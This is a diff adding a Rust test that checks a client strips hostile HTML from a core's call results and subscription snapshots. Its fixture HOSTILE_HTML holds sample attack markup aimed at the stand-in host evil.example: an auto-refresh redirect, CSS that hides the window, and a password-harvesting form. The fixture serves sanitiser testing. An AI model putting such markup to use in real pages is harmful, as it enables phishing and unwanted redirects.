@@ -461,6 +461,84 @@ async fn an_upload_stops_at_eight_parts_until_the_core_gives_credit() {
     assert_eq!(error.code, ErrorCode::BlobCorrupt);
 }
 
+/// The HTML of a plan that a hostile core sends: a refresh that opens a link with no click, a
+/// style that hides the window, and a form that asks for a password.
+const HOSTILE_HTML: &str = concat!(
+    r#"<meta http-equiv="refresh" content="0;url=nh://open?url=https%3A%2F%2Fevil.example">"#,
+    r#"<style>body { display: none }</style>"#,
+    r#"<form action="https://evil.example"><input type="password"></form>"#,
+    r#"<p>the plan</p>"#,
+);
+
+struct Collect(Arc<std::sync::Mutex<Vec<serde_json::Value>>>);
+
+impl nh_core::MessageSink for Collect {
+    fn send(&self, message: serde_json::Value) -> bool {
+        self.0
+            .lock()
+            .unwrap_or_else(std::sync::PoisonError::into_inner)
+            .push(message);
+        true
+    }
+}
+
+#[tokio::test]
+async fn the_client_cleans_the_html_of_a_result_and_of_a_projection_again() {
+    let (client, mut core, _) = linked(LinkTiming::default()).await;
+    let call = {
+        let client = client.clone();
+        tokio::spawn(async move {
+            client
+                .call(None, "timeline.item_get", serde_json::json!({}))
+                .await
+        })
+    };
+    let Some(LinkMsg::Call { id, .. }) = core.recv().await else {
+        panic!("expected the call");
+    };
+    let result = serde_json::json!({ "html": HOSTILE_HTML, "truncated": false });
+    core.send(&LinkMsg::Reply {
+        id,
+        outcome: nh_remote::msg::Outcome::Ok(serde_json::to_vec(&result).expect("JSON")),
+    })
+    .await;
+    let text = call.await.expect("joins").expect("a result");
+    assert_eq!(text["html"], "<p>the plan</p>");
+
+    let seen = Arc::new(std::sync::Mutex::new(Vec::new()));
+    let subscribe = {
+        let client = client.clone();
+        let sink = Box::new(Collect(Arc::clone(&seen)));
+        tokio::spawn(async move { client.subscribe("interactions", None, sink).await })
+    };
+    let Some(LinkMsg::Subscribe { sub, .. }) = core.recv().await else {
+        panic!("expected the subscription");
+    };
+    let snapshot = serde_json::json!({ "type": "snapshot", "version": 1, "data": {
+        "items": { "i1": { "payload": { "plan": { "html": HOSTILE_HTML } } } },
+        "order": ["i1"] } });
+    core.send(&LinkMsg::Projection {
+        sub,
+        message: serde_json::to_vec(&snapshot).expect("JSON"),
+    })
+    .await;
+    core.send(&LinkMsg::Reply {
+        id: sub,
+        outcome: nh_remote::msg::Outcome::Ok(b"{\"subscription\":\"s1\"}".to_vec()),
+    })
+    .await;
+    subscribe.await.expect("joins").expect("subscribed");
+    let seen = seen
+        .lock()
+        .unwrap_or_else(std::sync::PoisonError::into_inner)
+        .clone();
+    assert_eq!(seen.len(), 1, "{seen:?}");
+    assert_eq!(
+        seen[0]["data"]["items"]["i1"]["payload"]["plan"]["html"],
+        "<p>the plan</p>"
+    );
+}
+
 #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
 async fn a_file_over_the_limit_is_refused_before_a_byte_goes() {
     let (client, mut core, _host) = linked(LinkTiming::default()).await;
